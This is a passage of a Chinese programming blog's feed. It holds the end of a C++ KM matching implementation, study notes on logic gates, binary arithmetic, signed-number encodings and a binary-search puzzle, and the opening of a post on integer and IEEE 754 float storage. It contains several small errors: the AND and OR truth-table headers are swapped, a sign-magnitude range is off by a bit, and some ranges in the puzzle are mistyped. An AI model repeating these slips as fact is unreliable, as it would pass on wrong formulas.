<span id="cb3-32"><a href="#cb3-32"></a>                    minDelta = sndNeed[i];</span>
<span id="cb3-33"><a href="#cb3-33"></a>                    minSnd = i;</span>
<span id="cb3-34"><a href="#cb3-34"></a>                }</span>
<span id="cb3-35"><a href="#cb3-35"></a>            }</span>
<span id="cb3-36"><a href="#cb3-36"></a>        }</span>
<span id="cb3-37"><a href="#cb3-37"></a></span>
<span id="cb3-38"><a href="#cb3-38"></a>        fstEx[fstId] -= minDelta;</span>
<span id="cb3-39"><a href="#cb3-39"></a>        <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb3-40"><a href="#cb3-40"></a>            <span class="cf">if</span> (sndVisited[i]) {</span>
<span id="cb3-41"><a href="#cb3-41"></a>                fstEx[sndMatch[i]] -= minDelta;</span>
<span id="cb3-42"><a href="#cb3-42"></a>                sndEx[i] += minDelta;</span>
<span id="cb3-43"><a href="#cb3-43"></a>            } <span class="cf">else</span> {</span>
<span id="cb3-44"><a href="#cb3-44"></a>                sndNeed[i] -= minDelta;</span>
<span id="cb3-45"><a href="#cb3-45"></a>            }</span>
<span id="cb3-46"><a href="#cb3-46"></a>        }</span>
<span id="cb3-47"><a href="#cb3-47"></a>        cntSnd = minSnd;</span>
<span id="cb3-48"><a href="#cb3-48"></a>    }</span>
<span id="cb3-49"><a href="#cb3-49"></a></span>
<span id="cb3-50"><a href="#cb3-50"></a>    <span class="cf">while</span> (cntSnd != -<span class="dv">1</span>) {</span>
<span id="cb3-51"><a href="#cb3-51"></a>        <span class="cf">if</span> (pre[cntSnd] == -<span class="dv">1</span>)</span>
<span id="cb3-52"><a href="#cb3-52"></a>            sndMatch[cntSnd] = fstId;</span>
<span id="cb3-53"><a href="#cb3-53"></a>        <span class="cf">else</span></span>
<span id="cb3-54"><a href="#cb3-54"></a>            sndMatch[cntSnd] = sndMatch[pre[cntSnd]];</span>
<span id="cb3-55"><a href="#cb3-55"></a>        cntSnd = pre[cntSnd];</span>
<span id="cb3-56"><a href="#cb3-56"></a>    }</span>
<span id="cb3-57"><a href="#cb3-57"></a>}</span>
<span id="cb3-58"><a href="#cb3-58"></a></span>
<span id="cb3-59"><a href="#cb3-59"></a><span class="dt">int</span> hungarian() {</span>
<span id="cb3-60"><a href="#cb3-60"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb3-61"><a href="#cb3-61"></a>        sndMatch[i] = -<span class="dv">1</span>;</span>
<span id="cb3-62"><a href="#cb3-62"></a>        sndEx[i] = <span class="dv">0</span>;</span>
<span id="cb3-63"><a href="#cb3-63"></a>    }</span>
<span id="cb3-64"><a href="#cb3-64"></a></span>
<span id="cb3-65"><a href="#cb3-65"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; fstNum; i++) {</span>
<span id="cb3-66"><a href="#cb3-66"></a>        fstEx[i] = arr[i][<span class="dv">0</span>];</span>
<span id="cb3-67"><a href="#cb3-67"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">1</span>; j &lt; sndNum; j++) {</span>
<span id="cb3-68"><a href="#cb3-68"></a>            fstEx[i] = max(fstEx[i], arr[i][j]);</span>
<span id="cb3-69"><a href="#cb3-69"></a>        }</span>
<span id="cb3-70"><a href="#cb3-70"></a>    }</span>
<span id="cb3-71"><a href="#cb3-71"></a></span>
<span id="cb3-72"><a href="#cb3-72"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb3-73"><a href="#cb3-73"></a>        bfs(i);</span>
<span id="cb3-74"><a href="#cb3-74"></a>    }</span>
<span id="cb3-75"><a href="#cb3-75"></a></span>
<span id="cb3-76"><a href="#cb3-76"></a>    <span class="dt">int</span> ans = <span class="dv">0</span>;</span>
<span id="cb3-77"><a href="#cb3-77"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; sndNum; i++) {</span>
<span id="cb3-78"><a href="#cb3-78"></a>        <span class="cf">if</span> (sndMatch[i] != -<span class="dv">1</span>)</span>
<span id="cb3-79"><a href="#cb3-79"></a>            ans += arr[sndMatch[i]][i];</span>
<span id="cb3-80"><a href="#cb3-80"></a>    }</span>
<span id="cb3-81"><a href="#cb3-81"></a>    <span class="cf">return</span> ans;</span>
<span id="cb3-82"><a href="#cb3-82"></a>}</span></code></pre></div>
</div>
</div>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>李煜东 - 《算法竞赛进阶指南》</li>
<li>Renfei Song - <a href="https://www.renfei.org/blog/bipartite-matching.html">二分图的最大匹配、完美匹配和匈牙利算法</a></li>
<li>liam0205 - <a href="https://liam0205.me/2016/04/03/icpc-notes/hungarian-algorithm-in-the-maximum-matching-problem-of-bigraph/">二分图最大匹配问题与匈牙利算法的核心思想</a></li>
<li>Dark_Scope - <a href="http://blog.csdn.net/dark_scope/article/details/8880547">趣写算法系列之–匈牙利算法</a></li>
<li>SixDayCoder - <a href="http://blog.csdn.net/sixdaycoder/article/details/47720471">二分图的最佳完美匹配——KM算法</a></li>
<li>伊甸一点 - <a href="https://www.cnblogs.com/zpfbuaa/p/7218607.html">我的KM算法详解</a></li>
<li>段文弱 - <a href="http://www.cnblogs.com/wenruo/p/5264235.html">KM算法详解+模板</a></li>
<li>C20182030EPIC - <a href="https://blog.csdn.net/c20182030/article/details/73330556">【原创】KM算法的Bfs写法</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>计算导论: 计算系统基本思维</title>
			<link>https://codgician.me/zh-hans/posts/2017/08/basics-on-computational-thinking/</link>
			<pubDate>Sat, 19 Aug 2017 23:03:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2017/08/basics-on-computational-thinking/</guid>
			<description>前言 逻辑运算 基本逻辑运算 “与”运算 AND：逻辑乘法 “或”运算 OR：逻辑加法 “非”运算 NOT：逻辑否定 复合逻辑运算 “与非”运算 NAND “或非”运算 NOR</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#前言">前言</a></li>
<li><a href="#逻辑运算">逻辑运算</a>
<ul>
<li><a href="#基本逻辑运算">基本逻辑运算</a>
<ul>
<li><a href="#与运算-and逻辑乘法">“与”运算 AND：逻辑乘法</a></li>
<li><a href="#或运算-or逻辑加法">“或”运算 OR：逻辑加法</a></li>
<li><a href="#非运算-not逻辑否定">“非”运算 NOT：逻辑否定</a></li>
</ul></li>
<li><a href="#复合逻辑运算">复合逻辑运算</a>
<ul>
<li><a href="#与非运算-nand">“与非”运算 NAND</a></li>
<li><a href="#或非运算-nor">“或非”运算 NOR</a></li>
<li><a href="#异或运算-xor">“异或”运算 XOR</a></li>
<li><a href="#同或运算-xnor">“同或”运算 XNOR</a></li>
</ul></li>
</ul></li>
<li><a href="#二进制与算术运算">二进制与算术运算</a>
<ul>
<li><a href="#数值表示">数值表示</a></li>
<li><a href="#符号表示">符号表示</a></li>
<li><a href="#数值运算">数值运算</a>
<ul>
<li><a href="#加法实现原理">加法实现原理</a></li>
<li><a href="#减法实现原理">减法实现原理</a></li>
<li><a href="#乘法实现原理">乘法实现原理</a></li>
<li><a href="#除法实现原理">除法实现原理</a></li>
</ul></li>
<li><a href="#小数点表示">小数点表示</a></li>
</ul></li>
<li><a href="#编码">编码</a></li>
<li><a href="#趣题赏析">趣题赏析</a></li>
<li><a href="#参考文献">参考文献</a></li>
</ul>
</div>

<div id="前言" class="section level1">
<h1>前言</h1>
<p>开学要考试啊 orz……</p>
<p>学校推荐预习《计算机与计算思维导论》，然而作死的我却购入了《大学计算机——计算思维导论》（因为更便宜）。作此文以梳理本蒟蒻觉得重要的地方，以试图减小开学考试对咸鱼造成的恐惧。</p>
</div>
<div id="逻辑运算" class="section level1">
<h1>逻辑运算</h1>
<div id="基本逻辑运算" class="section level2">
<h2>基本逻辑运算</h2>
<p>我们先从三种最常见的逻辑运算开始：</p>
<div id="与运算-and逻辑乘法" class="section level3">
<h3>“与”运算 AND：逻辑乘法</h3>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(B\)</span></th>
<th><span class="math inline">\(A + B\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
</div>
<div id="或运算-or逻辑加法" class="section level3">
<h3>“或”运算 OR：逻辑加法</h3>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(B\)</span></th>
<th><span class="math inline">\(AB\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
</div>
<div id="非运算-not逻辑否定" class="section level3">
<h3>“非”运算 NOT：逻辑否定</h3>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(\overline{A}\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="复合逻辑运算" class="section level2">
<h2>复合逻辑运算</h2>
<p>由以上介绍的三种基本逻辑运算，我们可以组合出常见的复合逻辑运算。</p>
<div id="与非运算-nand" class="section level3">
<h3>“与非”运算 NAND</h3>
<p>即<strong>先与后非</strong>。</p>
<p><span class="math display">\[
X \text{ NAND } Y = \overline{AB}
\]</span></p>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(B\)</span></th>
<th><span class="math inline">\(\overline{A \cdot B}\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<div id="或非运算-nor" class="section level3">
<h3>“或非”运算 NOR</h3>
<p>即<strong>先或后非</strong>。</p>
<p><span class="math display">\[
A \text{ NOR } B = \overline{A + B}
\]</span></p>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(B\)</span></th>
<th><span class="math inline">\(\overline{A + B}\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<div id="异或运算-xor" class="section level3">
<h3>“异或”运算 XOR</h3>
<p>相同为假，相异为真。</p>
<p><span class="math display">\[
A \oplus B = \bar{A}B + A\bar{B}
\]</span></p>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(B\)</span></th>
<th><span class="math inline">\(A \oplus B\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<div id="同或运算-xnor" class="section level3">
<h3>“同或”运算 XNOR</h3>
<p>相同为真，相异为假。</p>
<p><span class="math display">\[
A \odot B = \bar{A}\bar{B} + AB
\]</span></p>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(A\)</span></th>
<th><span class="math inline">\(B\)</span></th>
<th><span class="math inline">\(A \odot B\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>1</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div id="二进制与算术运算" class="section level1">
<h1>二进制与算术运算</h1>
<div id="数值表示" class="section level2">
<h2>数值表示</h2>
<p>有大小关系的数通常采用<em>进位制</em>表达，即<strong>用数码和带权值的数位</strong>来表示。</p>
<p>进制的基本概念就不啰嗦了吧…… r进制就是逢r进1。就只记下常见进制的英文以备后用吧：</p>
<ul>
<li>二进制 <strong>Binary</strong></li>
<li>八进制 <strong>Octal</strong></li>
<li>十进制 <strong>Decimal</strong></li>
<li>十六进制 <strong>Hexadecimal</strong></li>
</ul>
<p>在计算机中我们通常采用二进制，其主要优点有：</p>
<ol style="list-style-type: decimal">
<li>二进制运算规则简单；</li>
<li>二进制算术运算<strong>可与逻辑运算实现统一</strong>，即可以用逻辑运算实现算术运算；</li>
<li>能表示两种状态的元器件容易找到，如继电器开关、灯泡、二极管/三极管等。</li>
</ol>
<p>哦对了，唯一的重点就是十进制小数转二进制，小数部位使用乘 <span class="math inline">\(2\)</span> 取整法，按顺序写出，看到循环了取最小循环数就行了……</p>
</div>
<div id="符号表示" class="section level2">
<h2>符号表示</h2>
<p>我们来梳理几个基本概念：</p>
<ul>
<li><strong>原码</strong>： 如果机器字长为 <span class="math inline">\(n\)</span>，那么一个数的原码就是用一个 <span class="math inline">\(n\)</span> 位的二进制数。其中最高位为符号位（正为 <span class="math inline">\(0\)</span>，负为 <span class="math inline">\(1\)</span>）剩下的 <span class="math inline">\(n - 1\)</span> 位表示该数的绝对值。</li>
<li><strong>反码</strong>： 对于非负整数，反码与原码一样；对于负整数，在原码的基础上，符号位不变，其他位按位取反。</li>
<li><strong>补码</strong>： 对于非负整数，补码与原码一样；对于负整数，补码即反码 <span class="math inline">\(+ 1\)</span>。</li>
<li><strong>移码</strong>： 取补码并对其符号位取反。</li>
</ul>
<p>例如，对于 <span class="math inline">\(8\)</span> 位二进制：</p>
<p><span class="math inline">\(-1\)</span> 的原码为 <span class="math inline">\(1000 \ 0001\)</span>，反码为 <span class="math inline">\(1111 \ 1110\)</span> ，补码为 <span class="math inline">\(1111 \ 1111\)</span> ，移码为 <span class="math inline">\(0111 \ 1111\)</span>。</p>
<p>机器数，也就是一个在计算机中的二进制表示形式，可以用原码、反码和补码表示。若只使用原码表示，则 <span class="math inline">\(0\)</span> 有两种表示方式，即 <span class="math inline">\(+0\)</span> 和 <span class="math inline">\(-0\)</span> ，表示范围为<span class="math inline">\(-(2^n - 1) \sim +(2^n - 1)\)</span>。但若牵扯进补码的话 <span class="math inline">\(0\)</span> 就只有一种表示了，范围也就变成了<span class="math inline">\(-2^n \sim +(2^n - 1)\)</span>。如欲了解 C 语言中存储数字的具体方式，不妨参考上篇博文 <a href="https://codgician.me/zh-hans/posts/2017/08/on-int-and-float/">乱谈整型与浮点</a>。</p>
</div>
<div id="数值运算" class="section level2">
<h2>数值运算</h2>
<div id="加法实现原理" class="section level3">
<h3>加法实现原理</h3>
<p>我们不妨把加法运算分为两个部分：<strong>按位加过程 和 进位过程</strong>。</p>
<p>首先，我们来研究一下一位二进制的加法运算问题：</p>
<table>
<thead>
<tr class="header">
<th>A</th>
<th>B</th>
<th>SUM</th>
<th>CARRY</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr class="even">
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr class="odd">
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr class="even">
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
</tbody>
</table>
<p>很容易发现，<strong>SUM（和）</strong> 一栏即为前面介绍到的 <strong>“异或”运算</strong>，而 <strong>CARRY（进位）</strong> 则为前面介绍到的<strong>“与”运算</strong>。</p>
<p>我们记 <span class="math inline">\(A_i, \ B_i\)</span> 分别为第 <span class="math inline">\(i\)</span> 位加数和被加数，<span class="math inline">\(C_i\)</span> 为第 <span class="math inline">\(i - 1\)</span> 位运算产生的进位，<span class="math inline">\(S_i\)</span> 为第 <span class="math inline">\(i\)</span> 位运算的和，<span class="math inline">\(C_{i + 1}\)</span> 为产生的进位，这样就可以总结出下列公式：</p>
<div id="不考虑进位" class="section level4">
<h4>不考虑进位</h4>
<p><span class="math display">\[
\begin{cases}
S_i = A_i \oplus B_i \\
C_{i + 1} = A_i B_i
\end{cases}
\]</span></p>
</div>
<div id="考虑进位" class="section level4">
<h4>考虑进位</h4>
<p><span class="math display">\[
\begin{cases}
S_i = A_i \oplus B_i \oplus C_i \\
C_{i + 1} = (A_i \oplus B_i)  C_i + A_i B_i
\end{cases}
\]</span></p>
</div>
</div>
<div id="减法实现原理" class="section level3">
<h3>减法实现原理</h3>
<p>先对减数取负，再执行上述加法即可。</p>
</div>
<div id="乘法实现原理" class="section level3">
<h3>乘法实现原理</h3>
<p>我们知道左移1位为乘以2，右移一位为除以 <span class="math inline">\(2\)</span>，因此计算机的乘法是由加法和位移组合实现的：</p>
<p><span class="math display">\[
\sum\limits_{i=0}^{k}a \cdot 2^n
\]</span></p>
</div>
<div id="除法实现原理" class="section level3">
<h3>除法实现原理</h3>
<div id="人类计算除法" class="section level4">
<h4>人类计算除法</h4>
<p>当我们在计算 <span class="math inline">\(51 / 3 = 17\)</span> ，抛开乘法表。</p>
<ol style="list-style-type: decimal">
<li>从被除数的最高位 <span class="math inline">\(5\)</span> 开始，从 <span class="math inline">\(0 \sim 9\)</span> 选一个数，使得 <span class="math inline">\(5 - i \times 3 \ge 0\)</span> 且使 <span class="math inline">\(5 - (i + 1) \times 3 &lt; 0\)</span>。我们选择了1，余数为2；</li>
<li>将余数<span class="math inline">\(2 \times 10 + 1 = 21\)</span>，继续从 0 ~ 9 中选一个数，使得<span class="math inline">\(21 - 3 \times i \ge 0\)</span>且使<span class="math inline">\(5 - (i + 1) \times 3 &lt; 0\)</span>。我们选择了 <span class="math inline">\(7\)</span>；</li>
<li>由此，我们找到了答案 <span class="math inline">\(17\)</span>。</li>
</ol>
</div>
<div id="计算机计算除法" class="section level4">
<h4>计算机计算除法</h4>
<p>计算机计算除法的过程与人类计算的过程很类似，只是选择范围变成了0或1。
还以 <span class="math inline">\(51 / 3\)</span> 为例说明（<span class="math inline">\(51 = 110011_2\)</span>；<span class="math inline">\(3 = 11_2\)</span>）</p>
<ol style="list-style-type: decimal">
<li>从第一位开始为 <span class="math inline">\(1\)</span>，小于 <span class="math inline">\(11\)</span>，结果位置 <span class="math inline">\(0\)</span>；余数为 <span class="math inline">\(1\)</span></li>
<li>从第二位开始，余数 <span class="math inline">\(1 \times 2 + 1 = 11\)</span>，等于 <span class="math inline">\(11\)</span>，结果位置 <span class="math inline">\(1\)</span>，余数为 <span class="math inline">\(0\)</span>；</li>
<li>从第三、四位开始，余数 <span class="math inline">\(0 \times 2 + 0 = 0 &lt; 011\)</span>，结果位置 <span class="math inline">\(0\)</span>，余数为 <span class="math inline">\(0\)</span>；</li>
<li>从第 <span class="math inline">\(5\)</span> 位开始，余数 <span class="math inline">\(0 \times 2 + 1 = 1 &lt; 11\)</span>，结果位置 <span class="math inline">\(0\)</span>，余数为 <span class="math inline">\(1\)</span>；</li>
<li>从第 <span class="math inline">\(6\)</span> 位开始，余数 <span class="math inline">\(1 \times 2 + 1 = 11 = 11\)</span>，结果位置 <span class="math inline">\(1\)</span>，余数为 <span class="math inline">\(0\)</span>。</li>
</ol>
<p>此时将结果位相连，恰好是 <span class="math inline">\(10001\)</span>（<span class="math inline">\(17\)</span>）。</p>
</div>
</div>
</div>
<div id="小数点表示" class="section level2">
<h2>小数点表示</h2>
<p>可以参考上篇博文 <a href="https://codgician.github.io/2017/08/18/on-int-and-float/">乱谈整型与浮点</a>中的“浮点数”部分。</p>
</div>
</div>
<div id="编码" class="section level1">
<h1>编码</h1>
<p><strong>概念：</strong> 以若干数位或符号的不同组合来表示非数值信息的方法，是人为将若干数码或符号的每种组合钦定一种唯一的含义。</p>
<p><strong>特性</strong>：</p>
<ul>
<li>唯一性：每种组合都有唯一确定含义。</li>
<li>公共性：所有相关者均认同、遵守、使用该种编码。</li>
<li>规律性：具有一定规律和一定编码规则，便于计算机和人使用它。</li>
</ul>
<p>ASCII 码、Unicode 和 GB2312-1980 不在本文中介绍，详情咨询百科。</p>
</div>
<div id="趣题赏析" class="section level1">
<h1>趣题赏析</h1>
<p>有 <span class="math inline">\(1000\)</span> 篇大新闻，其中一篇是长者的，香港记者只要报道了长者的新闻生命就会在 <span class="math inline">\(24h\)</span> 内被续掉，问至少要多少名香港记者才能在 <span class="math inline">\(24h\)</span> 内鉴别出长者的新闻？</p>
<p><del>鬼才想得到计算思维……</del></p>
<p>🐷：这还不简单，<span class="math inline">\(1000\)</span> 名就够啦。</p>
<p>😏：猪就是蠢，<span class="math inline">\(999\)</span> 名不就行啦。</p>
<p>🤓：其实 <span class="math inline">\(10\)</span> 名就够了。这其实是一个二进制转十进制问题。我们以 <span class="math inline">\(0\)</span> 代表记者存活，<span class="math inline">\(1\)</span> 代表记者被续。给记者编号 <span class="math inline">\(0 \sim 9\)</span>；给新闻编号 <span class="math inline">\(0 \sim 999\)</span>。</p>
<ol style="list-style-type: decimal">
<li>让 <span class="math inline">\(9\)</span> 号记者报道新闻 <span class="math inline">\(512 \sim 999\)</span>（<span class="math inline">\(2^9\)</span>）；</li>
<li>让 <span class="math inline">\(8\)</span> 号记者报道新闻 <span class="math inline">\(256 \sim 51, 768 \sim 999\)</span>（<span class="math inline">\(2^8\)</span>）；</li>
<li>让 <span class="math inline">\(7\)</span> 号记者报道新闻 <span class="math inline">\(128 \sim 255, 384 \sim 511, 640 \sim 767, 896 \sim 999\)</span>（<span class="math inline">\(2^7\)</span>）；</li>
<li>让 <span class="math inline">\(6\)</span> 号记者报道新闻 <span class="math inline">\(64 \sim 127, 192 \sim 255, 320 \sim 383, \dots, 936 \sim 999\)</span>（<span class="math inline">\(2^6\)</span>）；
……
依此类推，直到最后让 <span class="math inline">\(0\)</span> 号记者报道所有的奇数新闻（<span class="math inline">\(2^0\)</span>）。</li>
</ol>
<p><span class="math inline">\(24h\)</span> 后，将 <span class="math inline">\(0 \sim 9\)</span> 号记者的生存情况排列成一个二进制数，将其转换为 <span class="math inline">\(10\)</span> 进制，即为长者新闻编号。</p>
<p>例如，假设 <span class="math inline">\(817\)</span> 号新闻是长者的，那么根据上述步骤得到的二进制数即为：</p>
<p><span class="math display">\[
1100110001_2 = 817_{10}
\]</span></p>
<p>还没懂？</p>
<p>那我们这样想，二进制数转十进制数的过程是不是对二进制数的每一位（第 <span class="math inline">\(n\)</span> 位）乘以 <span class="math inline">\(2^n\)</span> 并求和。若 <span class="math inline">\(0\)</span> v号记者最终被续，那么长者新闻的编号自然含有 <span class="math inline">\(1 \times 2^9\)</span>，同理，若8号记者被续则必然含有 <span class="math inline">\(1 \times 2^8\)</span>…… 现在明白了吧。</p>
<p>为什么这样想？</p>
<p><span class="math inline">\(1000\)</span> 篇新闻，有一篇是能送命的，无非意味着一共仅有 <span class="math inline">\(1000\)</span> 种状态。我们只要找出一种方法能够表示这种状态就可以了——比如 <span class="math inline">\(10\)</span> 位二进制就是一个不错的选择（<del>状压 DP 入门？</del>）。</p>
</div>
<div id="参考文献" class="section level1">
<h1>参考文献</h1>
<ul>
<li>战德臣、聂兰顺等 - 《大学计算机——计算思维导论》</li>
<li>战德臣老师在中国大学MOOC上的在线课程</li>
<li>点奇 - <a href="http://blog.csdn.net/qq_16234613/article/details/55505035">数字逻辑电路 逻辑运算 与、或、非、与非、或非、与或非、异或、同或</a></li>
<li>刘水镜 - <a href="http://blog.csdn.net/liushuijinger/article/details/7429197">原码、反码、补码和移码其实很简单</a></li>
<li>匿名用户 - <a href="https://zhihu.com/question/22261713/answer/20805633">计算机怎么计算，具体工作原理是什么？</a></li>
<li>小橋流水 - <a href="http://www.cnblogs.com/youwang/archive/2011/12/22/2298585.html">一道关于计算机如何做加法的面试题</a></li>
<li>中华胡杨的专栏 - <a href="http://blog.csdn.net/zdavb/article/details/47108505">计算机计算乘除法的原理</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>乱谈整型与浮点</title>
			<link>https://codgician.me/zh-hans/posts/2017/08/on-int-and-float/</link>
			<pubDate>Fri, 18 Aug 2017 22:43:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2017/08/on-int-and-float/</guid>
			<description>前言 前几天好友终于也入了 C/C++ 的邪教，问起了几个浮点相关的问题，让我终于意识到深陷现代语言泥潭的我早已忘却这些富有趣味但又基础地不能在基础的知识</description>
			<content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>前几天好友终于也入了 C/C++ 的邪教，问起了几个浮点相关的问题，让我终于意识到<del>深陷现代语言泥潭</del>的我早已忘却这些富有趣味但又基础地不能在基础的知识…… 在网上大量查阅相关资料后决定属文以记之。</p>
<h1 id="整型">整型</h1>
<p>注：本文中默认 <code>int</code> 长度为 $32$ 位。</p>
<h2 id="无符号整形">无符号整形</h2>
<p>这里以 <code>unsigned int</code> 为例（$32$ 位）。<code>unsigned int</code> 就是没有符号的 <code>int</code>，在内存里占用 $4$ Byte，也就是 $32$ bit。很容易得知其能存储的最小值为 $0$，最大值则为 $2^{32} - 1 = 4294967295$。</p>
<h2 id="整形">整形</h2>
<p>int 是带有符号的，因此其所占据的第 $0 \sim 31$ 位中第 $31$ 位是用于存储符号的（$0$ 为正，$1$ 为负）。当然你会问，既然所有位均为 $0$ 时变量的值为 $0$，那么符号位为 $1$ 时剩余位为 $0$ 表示的又是什么呢？</p>
<p>这里就要牵扯进 <em>补数 (2’s complement，又称二补数)</em> 的概念了。</p>
<blockquote>
<p>一个数字的二补数就是将该数字作<em>比特反相运算（即反码）</em>，再将结果加 1。在二补数系统中，一个负数就是用其对应正数的二补数来表示。(<em>Wikipedia</em>，有修改)</p>
</blockquote>
<p>而借助二补数性质进行编码的编码系统则简称补码，在补码系统中，我们采用如下方式表示每一个数：</p>
<ul>
<li>对于非负数，采用原始二进制表示；</li>
<li>对于负数，符号位为 $1$，剩余位采用其补数表示。</li>
</ul>
<p>为了方便，我们假定一种只有 $8$ 位的整型数据类型来举几个例子（注意下面列出的是对应的补码不是二补数）：</p>
<table>
<thead>
<tr>
<th>符号位</th>
<th></th>
<th>=</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1 1 1 1 1 1 1</td>
<td><strong>127</strong></td>
</tr>
<tr>
<td>0</td>
<td>0 0 0 0 0 1 0</td>
<td><strong>2</strong></td>
</tr>
<tr>
<td>0</td>
<td>0 0 0 0 0 0 1</td>
<td><strong>1</strong></td>
</tr>
<tr>
<td>0</td>
<td>0 0 0 0 0 0 0</td>
<td><strong>0</strong></td>
</tr>
<tr>
<td>1</td>
<td>1 1 1 1 1 1 1</td>
<td><strong>-1</strong></td>
</tr>
<tr>
<td>1</td>
<td>1 1 1 1 1 1 0</td>
<td><strong>-2</strong></td>
</tr>
<tr>
<td>1</td>
<td>0 0 0 0 0 0 1</td>
<td><strong>-127</strong></td>
</tr>
<tr>
<td>1</td>
<td>0 0 0 0 0 0 0</td>
<td><strong>-128</strong></td>
</tr>
</tbody>
</table>
<p>我们可以容易地总结出以下两点：</p>
<ul>
<li>取负运算实际上就是取该数的二补数 ($\sim x + 1$)。</li>
<li>有两个数的二补数等于其本身：$0$ 和 $-128$ (溢出了，所以就变成自己了)。</li>
</ul>
<p>至此，我们也应该理解为什么 $32$ 位整型的取值范围是 $-2147483648 \sim 2147483647$ 了。</p>
<h1 id="浮点">浮点</h1>
<p>在 C 语言中，浮点数的存储均遵循 IEEE 754 标准。我们不妨结合标准内容来对 <code>float</code> 做一番介绍。</p>
<p>注：并不是在任何情况下浮点数的存储都遵循 IEEE 754 标准！这里仅介绍 IEEE 754 标准。</p>
<h2 id="整体结构">整体结构</h2>
<p>在 IEEE 754 中，浮点数的存储被划为三个部分：<em>符号位 (sign bit)、阶码 (biased exponent)、尾码 (mantissa)</em>。在单精度中它们的长度分别为 $1$ bit、$8$ bit 和 $23$  bit；双精度中它们的长度分别为 $1$ bit、$11$ bit 和 $52$ bit。</p>
<p>为了方便展示，不妨从 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Representation_of_non-numbers">Wikipedia</a> 盗两张图下来（遵循  <a href="https://en.wikipedia.org/wiki/Wikipedia:Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License">Creative Commons Attribution-ShareAlike License</a>）：</p>
<h3 id="单精度">单精度</h3>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/IEEE_754_Single_Floating_Point_Format.svg" alt="Single precision"></p>
<h3 id="双精度">双精度</h3>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/IEEE_754_Double_Floating_Point_Format.svg" alt="Double precision"></p>
<p>我们知道任意一个<strong>二进制</strong>浮点数 $V$ 都可以表示为（科学记数法）：</p>
